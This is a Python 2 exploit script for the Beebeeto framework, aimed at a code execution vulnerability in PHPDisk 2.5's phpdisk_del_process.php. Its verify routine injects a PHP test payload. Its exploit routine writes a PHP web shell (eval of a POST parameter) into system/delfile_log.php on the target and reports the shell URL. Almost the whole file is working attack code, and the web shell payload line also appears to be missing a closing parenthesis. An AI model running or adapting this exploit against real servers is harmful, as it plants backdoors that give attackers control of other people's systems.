#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0087',
            'name': 'PHPDisk 2.5 /phpdisk_del_process.php 代码执行漏洞 POC & Exploit',
            'author': 'foundu',
            'create_date': '2014-10-20',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'PHPDisk',
            'vul_version': ['2.5'],
            'type': 'Code Execution',
            'tag': ['PHPDisk E_Core 漏洞', '代码执行漏洞', '/phpdisk_del_process.php'],
            'desc': '利用环境比较鸡肋，代码执行需要关闭short_open_tag',
            'references': ['http://wooyun.org/bugs/wooyun-2014-057665',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        del_url = args['options']['target'] + '/phpdisk_del_process.php?a'
        shell_url = args['options']['target'] + '/system/delfile_log.php'
        data = {
            'pp': 'system/install.lock',
            'file_id': '<?php echo md5(233333);?>#',
            'safe': 'a'
        }
        post_data = urllib.urlencode(data)
        request = urllib2.Request(del_url, post_data)
        response = urllib2.urlopen(request)
        shell_request = urllib2.Request(shell_url)
        shell_response = urllib2.urlopen(shell_request)
        content = shell_response.read()
        if args['options']['verbose']:
            print '[*] Request URL: ' + del_url
            print '[*] Request URL2: ' + shell_url
        match = re.search('fb0b32aeafac4591c7ae6d5e58308344', content)
        if match:
            args['success'] = True
            args['poc_ret']['vul_url'] = shell_url
            return args
        args['success'] = False
        return args

    @classmethod
    def exploit(cls, args):
        del_url = args['options']['target'] + '/phpdisk_del_process.php?a'
        shell_url = args['options']['target'] + '/system/delfile_log.php'
        data = {
            'pp': 'system/install.lock',
            'file_id': '<?php echo md5(233333);eval($_POST[bb2];?>#',
            'safe': 'a'
        }
        post_data = urllib.urlencode(data)
        request = urllib2.Request(del_url, post_data)
        response = urllib2.urlopen(request)
        shell_request = urllib2.Request(shell_url)
        shell_response = urllib2.urlopen(shell_request)
        content = shell_response.read()
        if args['options']['verbose']:
            print '[*] Request URL: ' + del_url
            print '[*] Request URL2: ' + shell_url
        match = re.search('fb0b32aeafac4591c7ae6d5e58308344', content)
        if match:
            args['success'] = True
            args['poc_ret']['webshell'] = shell_url
            args['poc_ret']['content'] = '<?php echo md5(233333);eval($_POST[bb2];?>'
            return args
        args['success'] = False
        return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())